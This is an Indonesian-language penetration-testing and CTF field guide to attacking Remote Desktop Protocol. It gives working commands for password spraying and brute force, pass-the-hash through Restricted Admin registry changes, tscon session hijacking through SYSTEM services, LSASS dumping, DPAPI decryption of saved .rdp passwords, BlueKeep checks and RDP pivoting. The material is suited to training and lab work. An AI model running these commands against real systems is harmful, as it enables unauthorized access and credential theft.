---
id: "12"
title: "12. RDP Exploitation & Remote Desktop Workflow — Master Field Guide"
category: "2. Network Services"
categoryId: "network"
filename: "12_rdp_workflow.md"
refs_out: ["03","05","06","11","13","35","43","45","64"]
refs_in: ["04","05","08","11","14a","14b","17b","17c","35","36","37","41","42","46"]
---

# 12. RDP Exploitation & Remote Desktop Workflow — Master Field Guide

```text
==================================================================================
DOCUMENTATION TYPE : Service Exploitation Workflow (Network & Remote Management)
SERVICE TARGET     : Remote Desktop Protocol (RDP / Terminal Services)
DEFAULT PORTS      : TCP 3389 (Standard RDP), UDP 3389 (RDP8 Transport Acceleration)
TARGET AUDIENCE    : Penetration Testers, CTF Players (HTB / THM / Proving Grounds)
PLATFORM CONTEXT   : Parrot OS XFCE / Debian CLI
PREREQUISITES      : [03. Nmap Master Workflow & Network Scanning — Panduan Komprehensif](/docs/nmap-master), [05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba), [06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh), [11_ldap_workflow.md — Pentest Workflow: LDAP & Active Directory Enumeration](/docs/ldap)
==================================================================================
```

---

## 🧠 BAGIAN 1: RDP FUNDAMENTALS

### 1.1 Apa itu RDP dan Cara Kerjanya? (Analogi Remote Control TV)

**Remote Desktop Protocol (RDP)** adalah protokol proprietary Microsoft yang memungkinkan pengguna terhubung ke komputer lain melalui jaringan dan mengontrol antarmuka grafisnya (*Graphical User Interface / GUI*) secara penuh seolah-olah sedang duduk tepat di depan monitor mesin tersebut.

```text
+=============================================================================+
|                      ANALOGI REMOTE CONTROL TV DIGITAL                      |
+=============================================================================+
|                                                                             |
|  [ KLIEN PENTESTER (Parrot OS) ]                                            |
|  Mengirimkan sinyal tombol keyboard & koordinat klik mouse                  |
|                                │                                            |
|                      (TCP Port 3389 Stream)                                 |
|                                ▼                                            |
|  [ SERVER TARGET (Windows Server / Workstation) ]                           |
|  Menerima input, memprosesnya di sesi Windows, lalu menyiarkan balik        |
|  gambar layar desktop secara visual (kompresi grafis bitmaps/GDI)          |
|                                                                             |
+=============================================================================+
```

* **Kenapa RDP Menjadi Target Emas di Pentest & CTF?**
  1. **Akses GUI Langsung**: Berbeda dengan shell CLI (seperti NetExec atau Evil-WinRM), RDP memberikan sesi desktop visual interaktif penuh.
  2. **Credential Exposure di Memori**: Ketika user masuk ke sesi GUI Windows, proses `lsass.exe` akan meng-cache kredensial pengguna (NTLM hash, Kerberos ticket, atau plaintext token) di memori RAM.
  3. **Vektor Lateral Movement**: Administrator perusahaan sering menggunakan RDP untuk berpindah antar-server, meninggalkan sesi aktif yang rentan dibajak (*Session Hijacking*).

---

### 1.2 Port Standar & Non-Standar RDP

```text
+----------+-----------+-----------------------------------------------------------+
| Port     | Protokol  | Deskripsi & Kegunaan                                      |
+----------+-----------+-----------------------------------------------------------+
| 3389     | TCP       | Port standar default komunikasi RDP Microsoft.            |
+----------+-----------+-----------------------------------------------------------+
| 3389     | UDP       | Diperkenalkan pada RDP v8 (Windows 8/Server 2012) untuk   |
|          |           | streaming grafis berkecepatan tinggi (WAN Acceleration).  |
+----------+-----------+-----------------------------------------------------------+
| 3388     | TCP       | Port alternatif yang sering dipakai admin untuk obfuski. |
+----------+-----------+-----------------------------------------------------------+
| 3390     | TCP       | Port alternatif sekunder (sering di port forwarding NAT).|
+----------+-----------+-----------------------------------------------------------+
```

---

### 1.3 Apa itu NLA (Network Level Authentication)?

**Network Level Authentication (NLA)** adalah mekanisme pertahanan RDP yang mewajibkan pengguna melakukan otentikasi kredensial terlebih dahulu sebelum sesi koneksi RDP penuh dan layar desktop Windows dimuat. NLA memanfaatkan protokol **CredSSP (Credential Security Support Provider)** melalui enkripsi TLS.

```text
NON-NLA (Legacy / Rentan):
[ Klien ] ─── 1. Sambungkan RDP ───> [ Server Windows ]
[ Klien ] <── 2. Tampilkan GUI Layar Login Windows ─── [ Server Windows ]
* Penyerang bisa melihat nama user login sebelumnya, versi OS, dan melakukan DoS / Brute Force.

DENGAN NLA (Modern / Standar Windows 10 & Server 2016+):
[ Klien ] ─── 1. Kirim Kredensial via TLS CredSSP ───> [ Server Windows ]
[ Klien ] <── 2. Validasi Berhasil? Buka Sesi RDP! ─── [ Server Windows ]
* Jika kredensial salah, koneksi langsung diputus TANPA menampilkan layar login Windows.
```

* **Implikasi Bagi Pentester:**
  * **NLA Disabled**: Anda dapat membuka jendela RDP untuk melihat tampilan login screen, nama domain, akun login terakhir, atau mengeksploitasi kerentanan pre-authentication seperti **BlueKeep (CVE-2019-0708)**.
  * **NLA Enabled**: Anda **wajib** memiliki username dan password (atau NTLM hash) yang valid sebelum xfreerdp dapat merender koneksi.

---

### 1.4 RDP Restricted Admin Mode

Secara default, saat user melakukan login RDP, Windows mengirimkan kredensial plaintext ke server target untuk didekripsi oleh LSASS. Ini berbahaya bagi administrator karena jika server target sudah terinfeksi malware, kredensial Domain Admin akan dicuri dari memori target.

Microsoft merilis **Restricted Admin Mode** (`/restrictedAdmin`):
* Klien **TIDAK** mengirimkan kredensial plaintext ke server target.
* Otentikasi dilakukan sepenuhnya menggunakan protokol NTLM challenge-response dua arah.
* **IMPLIKASI PENTEST**: Fitur ini memungkinkan penyerang melakukan **Pass-the-Hash (PtH) langsung ke GUI RDP** tanpa mengetahui password teks biasa!

---

### 1.5 Apa itu RDP Session Hijacking?

Windows Terminal Services mengelola beberapa sesi login sekaligus (Session ID 0 untuk Console, Session ID 1, 2, dst untuk RDP user).
* Jika penyerang berhasil memperoleh akses **NT AUTHORITY\SYSTEM** di mesin target, penyerang dapat menggunakan utilitas bawaan Windows `tscon.exe` untuk membajak sesi desktop milik user lain yang sedang aktif atau disconnected **TANPA MEMERLUKAN PASSWORD USER TERSEBUT!**

---

### 1.6 Perbandingan Tool Client: `xfreerdp` vs. `rdesktop` vs. `remmina`

```text
+--------------+------------------+---------------------+------------------------------------------+
| Tool         | Jenis Antarmuka  | Dukungan NLA / PTH  | Kapan Harus Digunakan?                   |
+--------------+------------------+---------------------+------------------------------------------+
| xfreerdp     | CLI (FreeRDP)    | YA (Lengkap & PTH)  | **STANDAR EMAS CTF**. Cepat, fleksibel,  |
|              |                  |                     | mendukung dynamic resolution & drive map.|
+--------------+------------------+---------------------+------------------------------------------+
| rdesktop     | CLI (Legacy)     | Terbatas / Non-NLA  | Berguna untuk mesin sangat tua (Windows  |
|              |                  |                     | 2000, XP, 2003) tanpa dukungan TLS modern|
+--------------+------------------+---------------------+------------------------------------------+
| remmina      | GUI Desktop      | YA                  | Berguna saat ingin screenshot cantik     |
|              |                  |                     | untuk laporan pentest profesional.       |
+--------------+------------------+---------------------+------------------------------------------+
```

---

## 🛠️ BAGIAN 2: TOOL ARSENAL RDP

```text
=======================================================================================================
TOOL               FUNGSI UTAMA                    KECEPATAN   DUKUNGAN NLA   PENGGUNAAN DI CTF
=======================================================================================================
xfreerdp           RDP Client Serbaguna            Tinggi      Ya             Login GUI, PtH, Mount Drive
nxc (NetExec)      Batch Credential Validator      Sangat Cepat Ya            Spray password & Cek NLA
nmap (NSE)         Fingerprinting & Vuln Scanner   Cepat       Ya             Cek enkripsi & BlueKeep
crowbar            RDP Brute Force Specialist      Sedang      Ya             Brute force RDP berbasis NLA
hydra              Multi-Protocol Brute Force      Rendah      Ya             Password spraying lambat
remmina            GUI Client Multi-Protokol       Sedang      Ya             Sesi interaktif santai
=======================================================================================================
```

---

### 2.1 `xfreerdp` — Primary CLI RDP Client di Linux

Tool wajib di Parrot OS untuk menghubungkan terminal Linux ke GUI Windows.

* **Instalasi & Verifikasi di Parrot OS:**
```bash
which xfreerdp || sudo apt install freerdp2-x11 -y
xfreerdp --version
```

* **Daftar Flag Paling Penting**:
  * `/v:<TARGET_IP>` : Menentukan IP atau FQDN target.
  * `/u:<USERNAME>` : Username Windows/Domain.
  * `/p:<PASSWORD>` : Password pengguna.
  * `/d:<DOMAIN>` : Nama domain NetBIOS atau FQDN (contoh: `CORP` atau `target.local`).
  * `/cert:ignore` : Mengabaikan peringatan sertifikat TLS self-signed (WAJIB di CTF!).
  * `/dynamic-resolution` : Mengizinkan jendela RDP di-resize secara dinamis mengikuti layar host.
  * `/size:1920x1080` : Menentukan resolusi fixed jika dynamic resolution tidak aktif.
  * `+clipboard` : Mengaktifkan sinkronisasi copy-paste antara Parrot OS dan Windows target.
  * `/drive:share,/home/user/loot` : Memetakan folder lokal Parrot OS ke Windows target (`\\tsclient\share`).
  * `/pth:<NTLM_HASH>` : Melakukan otentikasi Pass-the-Hash (membutuhkan Restricted Admin Mode).
  * `/sec:nla` / `/sec:tls` / `/sec:rdp` : Memaksa metode negosiasi keamanan spesifik.

```bash
# Perintah standar koneksi xfreerdp paling optimal untuk CTF:
xfreerdp /v:10.10.11.200 /u:administrator /p:'Password123!' /cert:ignore /dynamic-resolution +clipboard
```

---

### 2.2 `nxc` (NetExec) RDP Module — Quick Validation & Headless Screenshot

Menguji kredensial ke puluhan mesin RDP secara instan tanpa perlu memunculkan jendela GUI, serta mengambil bukti visual secara otomatis.

```bash
# 1. Cek status NLA dan informasi OS target:
nxc rdp 10.10.11.200

# 2. Uji satu kredensial valid:
nxc rdp 10.10.11.200 -u 'administrator' -p 'Password123!'

# 3. Ambil screenshot layar login RDP tanpa login GUI (Fitur Keren NetExec!):
nxc rdp 10.10.11.200 --screenshot

# 4. Screenshot sesi setelah terotentikasi (Headless Capture untuk Laporan):
nxc rdp 10.10.11.200 -u 'administrator' -p 'Password123!' --screenshot
```

* **Contoh Output NetExec**:
```text
RDP         10.10.11.200    3389   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:CORP) (nla:True)
RDP         10.10.11.200    3389   DC01             [+] CORP\administrator:Password123! 
RDP         10.10.11.200    3389   DC01             [+] Screen saved to ~/.nxc/screenshots/10.10.11.200_screenshot.png
```

---

### 2.3 `remmina` — GUI Client untuk Laporan Profesional

Meskipun `xfreerdp` adalah alat utama operasional CTF, `remmina` sangat berguna untuk navigasi santai dan mengambil screenshot desktop beresolusi tinggi untuk laporan akhir pentest.

```bash
# Install Remmina beserta plugin RDP di Parrot OS:
sudo apt install remmina remmina-plugin-rdp -y

# Jalankan GUI Remmina:
remmina &
```

---

### 2.3 `nmap` NSE Scripts untuk RDP

```bash
# 1. Periksa dukungan enkripsi dan NLA status:
nmap -p 3389 --script rdp-enum-encryption 10.10.11.200

# 2. Periksa detail NTLM dari RDP banner:
nmap -p 3389 --script rdp-ntlm-info 10.10.11.200

# 3. Periksa kerentanan DoS legacy MS12-020:
nmap -p 3389 --script rdp-vuln-ms12-020 10.10.11.200
```

---

### 2.4 `crowbar` & `hydra` — RDP Brute Force

> [!WARNING]
> **PERINGATAN RATE LIMITING & LOCKOUT:**  
> RDP memiliki overhead handshake yang berat (TLS + CredSSP + Session Negotiation). Brute force RDP sangat lambat (rata-rata 1–5 tebakan per detik) dan sangat mudah memicu **Account Lockout Policy** di Active Directory. Utamakan **Password Spraying** (1 password untuk semua user) dibandingkan brute force kamus besar!

```bash
# 1. Menggunakan Crowbar (Sangat direkomendasikan untuk RDP berbasis NLA):
# Install di Parrot OS jika belum ada:
sudo apt install crowbar -y
crowbar -b rdp -s 10.10.11.200/32 -u admin -C /usr/share/seclists/Passwords/Common-Credentials/top-20-common-passwords.txt

# 2. Menggunakan Hydra:
hydra -l administrator -P passwords.txt rdp://10.10.11.200 -t 1 -V
```

---

## 🎯 BAGIAN 3: WORKFLOW UTAMA (STEP BY STEP)

```bash
# Setup Environment Variable Target di Terminal Parrot OS:
export TARGET="10.10.11.200"
export USER="administrator"
export PASS="Password123!"
export DOMAIN="corp.local"
```

---

### FASE 1: RDP PORT DETECTION & FINGERPRINT

Tujuan: Mengetahui apakah port 3389 terbuka, apakah NLA aktif, dan mengekstrak nama hostname serta versi Windows.

```bash
# 1. Pemindaian Nmap Port 3389 TCP & UDP
sudo nmap -sS -sV -p 3389 $TARGET -oN nmap_rdp.txt

# 2. Ekstraksi Hostname, Domain FQDN, dan NLA via NetExec
nxc rdp $TARGET
```

* **Cara Membaca Output Fingerprint**:
  * `(nla:True)`: NLA aktif. Anda wajib memiliki kredensial sebelum dapat terhubung.
  * `(nla:False)`: NLA mati! Anda dapat langsung membuka `xfreerdp` tanpa kredensial untuk melihat layar login Windows.

---

### FASE 2: CREDENTIAL TESTING & VALIDASI KONEKSI

```bash
# 1. Uji Kredensial Tunggal Tanpa GUI
nxc rdp $TARGET -u "$USER" -p "$PASS" -d "$DOMAIN"

# 2. Batch Password Spraying terhadap daftar user dari modul LDAP (File 11):
nxc rdp $TARGET -u users.txt -p 'Welcome2024!' -d "$DOMAIN" --continue-on-success
```

---

### FASE 3: RDP ACCESS & SESSION NAVIGATION

Setelah memiliki kredensial valid, buka koneksi GUI menggunakan `xfreerdp` dengan optimasi lengkap:

```bash
# Perintah Koneksi Full Fitur:
xfreerdp /v:$TARGET \
  /u:"$USER" \
  /p:"$PASS" \
  /d:"$DOMAIN" \
  /cert:ignore \
  /dynamic-resolution \
  +clipboard \
  /drive:tools,/opt/windows_tools
```

* **Manfaat Parameter di Atas**:
  * `+clipboard`: Anda bisa menyalin exploit/perintah dari terminal Linux (Ctrl+C) dan menempelkannya langsung di PowerShell target (Ctrl+V).
  * `/drive:tools,/opt/windows_tools`: Folder `/opt/windows_tools` di Parrot OS Anda akan langsung muncul di Windows Explorer target sebagai drive jaringan virtual `\\tsclient\tools`. Anda dapat mengeksekusi `mimikatz.exe` atau `SharpHound.exe` langsung tanpa perlu mentransfer file عبر HTTP!

* **Keyboard Shortcuts Penting di xfreerdp**:
  * `Right-Ctrl`: Melepaskan cursor mouse dari jendela RDP kembali ke Linux host.
  * `Ctrl + Alt + Enter`: Toggle Fullscreen mode ON / OFF.

---

### FASE 4: PASS-THE-HASH (PtH) VIA RDP

Jika Anda mendapatkan NTLM hash dari ekstraksi hashdump ([05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba)) dan tidak berhasil meng-crack-nya secara offline, Anda bisa login ke GUI RDP menggunakan hash tersebut jika **Restricted Admin Mode** aktif di target!

#### 1. Uji Apakah Restricted Admin Mode Aktif
```bash
# Cek nilai registry DisableRestrictedAdmin di target:
# 0 = Restricted Admin Aktif (PtH BISA!)
# 1 / key not found = Restricted Admin Mati (PtH GAGAL)
nxc smb $TARGET -u "$USER" -H "$NTLM_HASH" -x "reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin"
```

#### 2. Cara Mengaktifkan Restricted Admin Mode (Jika sudah punya Admin Shell)
Jika Anda memiliki shell Administrator (misal via WinRM / SMB psexec), aktifkan fiturnya:
```bash
# Aktifkan Restricted Admin Mode via registry:
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

#### 3. Login Menggunakan NTLM Hash via `xfreerdp`
```bash
# Sintaks standar FreeRDP2 / FreeRDP3 (Gunakan flag /restricted-admin dengan dash):
xfreerdp /v:$TARGET /u:"$USER" /pth:e2b9c443a9b1c73a6e92b8d5a7d6e4c1 /cert:ignore +clipboard /restricted-admin

# Alternatif jika /restricted-admin tidak dikenali di versi FreeRDP tertentu:
xfreerdp /v:$TARGET /u:"$USER" /pth:e2b9c443a9b1c73a6e92b8d5a7d6e4c1 /cert:ignore +clipboard /sec:nla
```

---

### FASE 5: RDP SESSION HIJACKING (TANPA PASSWORD!)

> [!IMPORTANT]
> **KLARIFIKASI PRASYARAT SESSION HIJACKING (3 SITUASI PENTING):**
>
> * **SITUASI 1: Anda adalah `NT AUTHORITY\SYSTEM`**  
>   ➔ Perintah `tscon <ID> /dest:<SESSION>` langsung berhasil seketika membajak desktop target **TANPA MEMINTA PASSWORD**!
>
> * **SITUASI 2: Anda adalah Local Administrator (Bukan SYSTEM)**  
>   ➔ Windows akan memunculkan dialog box meminta password akun user target.  
>   ➔ **SOLUSI PENTEST/CTF:** Jalankan perintah `tscon` di bawah konteks service Windows (`sc create`) atau Scheduled Task (`schtasks /ru "SYSTEM"`), karena service otomatis berjalan sebagai SYSTEM!
>
> * **SITUASI 3: Anda adalah User Biasa (Low-Privilege)**  
>   ➔ Perintah `tscon` akan gagal dengan pesan error *Access Denied*. Anda wajib melakukan privilege escalation ke Administrator atau SYSTEM terlebih dahulu.

```text
+=============================================================================+
|                      ALUR RDP SESSION HIJACKING                             |
+=============================================================================+
|                                                                             |
|  1. Penyerang masuk sebagai user biasa / SYSTEM Shell di Port 5985 (WinRM). |
|  2. Cek daftar sesi aktif: Administrator sedang login di Session ID 3.       |
|  3. Jalankan `tscon 3 /dest:rdp-tcp#0` atas nama service SYSTEM.             |
|  4. Layar desktop Administrator langsung terbajak ke sesi RDP penyerang!     |
|                                                                             |
+=============================================================================+
```

#### Step 1: Periksa Daftar Sesi yang Sedang Aktif
Buka shell di target dan jalankan perintah:
```cmd
query session
:: atau:
qwinsta
```
* **Contoh Output**:
```text
 SESSIONNAME       USERNAME              ID  STATE   TYPE        DEVICE 
 services                                 0  Disc                        
 console                                  1  Conn                        
>rdp-tcp#0         lowpriv_user           2  Active                      
 rdp-tcp#5         Administrator          3  Active                      
```
* **Analisis**: Kita berada di sesi `2` sebagai `lowpriv_user`. Akun target `Administrator` berada di sesi `3`!

#### Step 2: Eskalasi ke SYSTEM & Bajak Sesi via `tscon`

##### Metode A: Menggunakan Windows Service (Paling Mudah di CTF)
Jika Anda sudah memiliki hak Administrator lokal dan ingin membajak sesi user lain tanpa ditanya password:
```cmd
# Buat service sementara yang berjalan sebagai SYSTEM untuk membajak sesi 3 ke sesi 2:
sc create HijackSession binpath= "cmd.exe /k tscon 3 /dest:rdp-tcp#0"
net start HijackSession
sc delete HijackSession
```
* **Hasil**: Dalam hitungan 1 detik, layar RDP Anda yang awalnya `lowpriv_user` akan langsung berubah menjadi desktop grafis milik **Administrator** lengkap dengan aplikasi yang sedang dibukanya!

##### Metode B: Menggunakan Task Scheduler (SYSTEM Privilege)
```cmd
schtasks /create /tn "RdpHijack" /tr "tscon 3 /dest:rdp-tcp#0" /sc once /st 00:00 /ru "SYSTEM"
schtasks /run /tn "RdpHijack"
schtasks /delete /tn "RdpHijack" /f
```

---

### FASE 6: SCREENSHOT & POST-EXPLOITATION ENUMERATION

Setelah berhasil masuk ke desktop RDP target:

```bash
# 1. Cek User Privileges di GUI Command Prompt:
whoami /all
whoami /priv

# 2. Berburu Password di Browser & File Manager:
# - Buka Google Chrome / Edge -> Settings -> Passwords (sering tersimpan password admin!)
# - Periksa Desktop dan folder Downloads untuk file config, .txt, .rdp, atau script backup.
# - Buka file C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\Recent\

# 3. Dump Kredensial Memori LSASS (Karena sudah memiliki GUI Admin):
# Buka Task Manager -> Tab Details -> Klik kanan lsass.exe -> "Create dump file"
# File tersimpan di: C:\Users\<USER>\AppData\Local\Temp\lsass.DMP
```

#### 4. Ekstraksi File Konfigurasi RDP (`.rdp`) & DPAPI Saved Credentials di CTF
Seringkali pada mesin CTF atau workstation target terdapat file koneksi `.rdp` di Desktop atau folder Downloads. File ini menyimpan konfigurasi sesi RDP sebelumnya, dan terkadang menyimpan kredensial login terenkripsi:

```cmd
:: Cek isi file .rdp yang mencurigakan:
type C:\Users\operator\Desktop\connection_to_dc.rdp
```

* **Field Penting di dalam file `.rdp`**:
```text
full address:s:192.168.10.10:3389
username:s:CORP\admin_service
password 51:b:01000000D08C9DDF0115D1118C7A00C04FC297EB... (Hash Terenkripsi DPAPI)
```

* **Cara Mendekripsi Password dari File `.rdp` (Menggunakan DPAPI PowerShell)**:
Jika Anda mengeksekusi perintah di bawah konteks user yang memiliki file tersebut, jalankan script PowerShell berikut untuk mendekripsi password DPAPI secara instan:
```powershell
$EncryptedBlob = "01000000D08C9DDF0115D1118C7A00C04FC297EB..."
$Bytes = for ($i = 0; $i -lt $EncryptedBlob.Length; $i += 2) { [Convert]::ToByte($EncryptedBlob.Substring($i, 2), 16) }
[System.Text.Encoding]::Unicode.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($Bytes, $null, 'CurrentUser'))
# Output: P@ssw0rdEnterprise2024!
```
* **Alternatif via Mimikatz**:
```cmd
mimikatz.exe "dpapi::cred /in:C:\Users\<USER>\AppData\Local\Microsoft\Credentials\<GUID>" exit
```

---

## 🛑 BAGIAN 4: RDP VULNERABILITIES (CVE CRITICAL)

```text
+---------------------+-------------------+-------------------------------+-------------------------------------------+
| Kerentanan          | CVE ID            | Target Sistem Operasi         | Dampak & Vektor Eksploitasi               |
+---------------------+-------------------+-------------------------------+-------------------------------------------+
| BlueKeep            | CVE-2019-0708     | Win 7, Server 2008 R2,        | **Remote Code Execution (Pre-Auth)**.     |
|                     |                   | Server 2008, Win XP           | Memanipulasi channel internal MS_T120.    |
+---------------------+-------------------+-------------------------------+-------------------------------------------+
| DejaBlue            | CVE-2019-1182 /   | Win 10, Win 8.1,              | **Remote Code Execution (Pre-Auth)**.     |
|                     | CVE-2019-1222     | Server 2012 / 2016 / 2019     | Bug parsing integer di modul RDP modern.  |
+---------------------+-------------------+-------------------------------+-------------------------------------------+
| MS12-020            | CVE-2012-0002     | Win XP, Vista, 7, Server 2003 | **Denial of Service / BSOD**.             |
|                     |                   | Server 2008                   | Paket `maxChannelIds` merusak kernel.     |
+---------------------+-------------------+-------------------------------+-------------------------------------------+
```

---

### 4.1 BlueKeep (CVE-2019-0708) — Analisis & Pendeteksian

BlueKeep adalah salah satu kerentanan RDP paling terkenal dalam sejarah keamanan Windows yang memungkinkan eksekusi kode jarak jauh tanpa otentikasi (*wormable pre-auth RCE*).

> [!NOTE]
> **CATATAN DETEKSI BLUEKEEP vs MS12-020:**  
> Nmap **TIDAK** memiliki script NSE resmi bawaan untuk mendeteksi BlueKeep (CVE-2019-0708). Script `rdp-vuln-ms12-020` adalah untuk kerentanan DoS legacy MS12-020, bukan BlueKeep.  
> Untuk mendeteksi BlueKeep secara akurat dan non-destruktif, gunakan Metasploit Scanner atau tool `rdpscan`.

* **1. Pengecekan Aman Menggunakan Metasploit Scanner (Paling Akurat)**:
```bash
msfconsole -q -x "
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep;
set RHOSTS 10.10.11.200;
set VERBOSE false;
run;
exit"
```
* **Contoh Output**:
```text
[+] 10.10.11.200:3389 - The target is vulnerable. (Windows 7 / Server 2008 R2 without NLA)
```

* **2. Pengecekan Kerentanan DoS Legacy MS12-020 (Nmap NSE)**:
```bash
nmap -p 3389 --script rdp-vuln-ms12-020 $TARGET
```

> [!CAUTION]
> **RISIKO CRASH (BSOD) PADA EXPLOIT BLUEKEEP:**  
> Modul exploit BlueKeep (`exploit/windows/rdp/cve_2019_0708_bluekeep_rce`) membutuhkan target arsitektur memory offsets yang sangat presisi (kernel Non-Paged Pool). Jika salah target atau salah offset, server akan langsung mengalami **Blue Screen of Death (BSOD)** dan reboot! Selalu utamakan scanning/audit non-destruktif.

---

## 🔗 BAGIAN 5: RDP + ATTACK CHAINING

```text
+=============================================================================+
|                        RDP ATTACK CHAINING TAXONOMY                         |
+=============================================================================+
```

### 🔗 Chain 1: LDAP Password ➔ RDP GUI Access ➔ Desktop Looting

```text
[ LDAP Anonymous Bind (File 11) ] ──> Leaked description: "jordan:Winter2024!"
                                                │
                                                ▼
[ Validasi Port 3389 ] ──> nxc rdp $TARGET -u 'jordan' -p 'Winter2024!'
                                                │
                                                ▼
[ xfreerdp Interactive GUI ] ──> Buka Browser Chrome ──> Stored Admin Portal Creds!
```

---

### 🔗 Chain 2: Mimikatz NTLM Hash ➔ Pass-the-Hash via RDP ➔ Admin Session

```text
[ SMB / WinRM Access ] ──> Dump SAM / LSA Secrets ──> Administrator:aad3b4...:31d6cfe0...
                                                │
                                                ▼
[ Restricted Admin Check ] ──> DisableRestrictedAdmin = 0
                                                │
                                                ▼
[ xfreerdp /pth ] ──> Langsung masuk ke Desktop Administrator tanpa crack hash!
```

---

### 🔗 Chain 3: Low-Priv Shell ➔ Session Hijacking (`tscon`) ➔ Domain Admin Desktop

```text
[ Reverse Shell (User Biasa) ] ──> query session (Ada user 'Administrator' aktif di ID 3)
                                                │
                                                ▼
[ Buat Service SYSTEM ] ──> sc create rdp_hijack binpath= "tscon 3 /dest:rdp-tcp#0"
                                                │
                                                ▼
[ Net Start Service ] ──> Layar desktop low-priv seketika berubah menjadi Domain Admin!
```

---

### 🔗 Chain 4: Shell WinRM / PowerShell ➔ Mengaktifkan RDP Jarak Jauh ➔ GUI Access

Sering kali di lingkungan CTF atau Enterprise, port 3389 dimatikan atau diblokir firewall lokal. Begitu Anda memperoleh akses CLI Administrator (misal melalui Evil-WinRM atau psexec), Anda dapat menyalakan service RDP dan membuka firewall dari command line:

```powershell
# 1. Aktifkan service Terminal Server (RDP):
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0

# 2. Buka izin rule firewall Windows untuk Port 3389:
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# 3. Aktifkan Restricted Admin Mode agar bisa Pass-the-Hash:
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# 4. Verifikasi apakah service TermService aktif:
Get-Service -Name TermService
```
Setelah langkah di atas, port 3389 terbuka dan siap disambungkan menggunakan `xfreerdp`!

---

## 🌐 BAGIAN 6: LATERAL MOVEMENT VIA RDP

### 6.1 SSH Dynamic Port Forwarding (Pivoting ke RDP Internal)

Seringkali server target di CTF/Enterprise memiliki antarmuka RDP yang hanya mendengarkan di IP localhost (`127.0.0.1:3389`) atau berada di subnet internal privat.

```bash
# 1. Buka Local Port Forwarding melalui koneksi SSH (File 06):
# Memetakan port lokal Parrot OS 33389 ke target internal 192.168.10.50:3389
ssh -L 33389:192.168.10.50:3389 user@10.10.11.200 -N -f

# 2. Sambungkan xfreerdp ke port lokal sendiri di Parrot OS:
xfreerdp /v:127.0.0.1:33389 /u:administrator /p:'Password123!' /cert:ignore +clipboard
```

### 6.2 ProxyChains + `xfreerdp`
Jika Anda menggunakan SOCKS5 proxy (misal melalui Chisel atau SSH Dynamic `-D 1080`):
```bash
proxychains4 xfreerdp /v:192.168.10.50 /u:administrator /p:'Password123!' /cert:ignore +clipboard
```

---

## 🌳 BAGIAN 7: DECISION TREE LENGKAP

```text
                         [PORT 3389 (RDP) TERBUKA]
                                     │
                     ┌───────────────┴───────────────┐
                     │                               │
             [NMAP NTLM & NLA]               [NETEXEC FINGERPRINT]
            nmap -p 3389 --script            nxc rdp $TARGET
               rdp-ntlm-info                         │
                     │                               │
                     └───────────────┬───────────────┘
                                     │
                         [APAKAH NLA DIAKTIFKAN?]
                                     │
                 ┌───────────────────┴───────────────────┐
                 │                                       │
           [NLA: TRUE]                             [NLA: FALSE]
                 │                                       │
     [BUTUH KREDENSIAL VALID]              [PRE-AUTH SCREEN TERBUKA]
                 │                                       │
     ┌───────────┴───────────┐             ┌─────────────┴─────────────┐
     │                       │             │                           │
[PUNYA PASSWORD]       [PUNYA HASH]   [CEK VULNERABILITY]      [SCREENSHOT LOGIN]
     │                       │        BlueKeep (CVE-2019-0708) nxc rdp --screenshot
     ▼                       ▼             │                           │
[xfreerdp STANDAR]    [CEK RESTRICTED]     ▼                           ▼
xfreerdp /v:$TARGET   DisableRestricted   [VULNERABLE?]         [KREDENSIAL USER?]
/u:$USER /p:$PASS     Admin == 0?                  │            Cari nama akun yang
     │                       │             ┌───────┴───────┐    sering ditampilkan
     │                 ┌─────┴─────┐       │               │    di layar login GUI
     │                 │           │     [YES]            [NO]
     │               [YES]        [NO]     │               │
     │                 │           │   Audit & Patch   Brute Force /
     │                 ▼           ▼   Verification    Spray Kredensial
     │         [xfreerdp /pth]  [CRACK]    │               │
     │         Login via NTLM    Hashcat   └───────┬───────┘
     │         Hash Langsung!    Offline           │
     │                 │           │               │
     └─────────────────┼───────────┴───────────────┘
                       │
             [BERHASIL LOGIN GUI RDP]
                       │
        ┌──────────────┴──────────────┐
        │                             │
 [USER PRIVILEGE]             [ADMIN PRIVILEGE]
        │                             │
 1. Cek Active Sessions        1. Dump LSASS Memory
    (query session)            2. Cek Browser Passwords
 2. Cari Admin Session         3. Enable RestrictedAdmin
 3. Hijack via SYSTEM service     (Persistensi PtH)
    (tscon <ID> /dest:<NAME>)  4. Pivot ke Subnet Baru
        │                             │
        └──────────────┬──────────────┘
                       ▼
          [FULL SYSTEM COMPROMISE]
```

---

## 🔧 BAGIAN 8: COMMON ERRORS & TROUBLESHOOTING (10 ERROR SOLUTIONS)

### 1. `Certificate verification failed (-1)`
* **Penyebab**: Server Windows menggunakan TLS Self-Signed Certificate yang tidak dipercaya oleh CA root Debian/Parrot OS.
* **Solusi CLI**: Tambahkan flag `/cert:ignore` (atau `/cert-ignore` di FreeRDP versi lama):
```bash
xfreerdp /v:$TARGET /u:$USER /p:$PASS /cert:ignore
```

---

### 2. `CredSSP Encryption Oracle Remediation Error (CVE-2018-0886)`
* **Penyebab**: Ketidakcocokan tingkat keamanan CredSSP antara klien Linux modern dan Windows target lama yang belum ter-patch.
* **Solusi CLI**: Paksa metode negosiasi keamanan menggunakan protokol RDP murni atau TLS standar:
```bash
# Coba turunkan security level:
xfreerdp /v:$TARGET /u:$USER /p:$PASS /cert:ignore /sec:tls
# Atau jika server sangat lama:
xfreerdp /v:$TARGET /u:$USER /p:$PASS /cert:ignore /sec:rdp
```

---

### 3. `Authentication failure, check credentials: NLA requires valid credentials`
* **Penyebab**: Target mengaktifkan NLA dan kredensial yang Anda masukkan salah atau format domain tidak disertakan.
